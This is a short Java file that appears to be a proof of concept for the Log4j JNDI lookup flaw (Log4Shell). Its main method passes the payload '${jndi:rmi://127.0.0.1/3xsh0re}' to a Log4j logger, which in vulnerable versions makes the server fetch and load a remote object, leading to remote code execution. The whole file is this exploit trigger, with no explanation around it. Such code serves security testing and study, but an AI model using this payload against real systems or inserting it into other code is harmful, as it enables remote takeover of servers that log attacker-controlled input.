

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Main {
    private static final Logger logger = LogManager.getLogger();
    public static void main(String[] args) {
        String payload = "${jndi:rmi://127.0.0.1/3xsh0re}";
        logger.error("run {}",payload);
    }
}